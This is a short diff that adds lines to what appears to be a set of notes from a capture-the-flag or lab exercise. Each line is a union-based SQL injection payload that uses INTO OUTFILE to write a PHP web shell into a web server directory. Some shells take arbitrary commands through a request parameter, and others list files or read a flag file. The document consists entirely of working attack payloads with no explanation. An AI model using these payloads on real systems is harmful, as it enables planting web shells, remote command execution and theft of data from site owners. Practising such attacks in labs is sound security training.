@@ -115,3 +115,9 @@ cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/
 cn' union select 1,2,'file written successfully!',3,4 into outfile '/var/www/html/dashboard/proof.txt'-- -
 
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+cn' union select "","",'<?php system(ls); ?>', "", "" into outfile '/var/www/html/dashboard/shell1.php'-- -
+
+cn' union select "","",'<?php system("dir /"); ?>', "", "" into outfile '/var/www/html/dashboard/shell6.php'-- -
+
+cn' union select "","",'<?php system("cat /flag_....txt"); ?>', "", "" into outfile '/var/www/html/dashboard/shell8.php'-- -
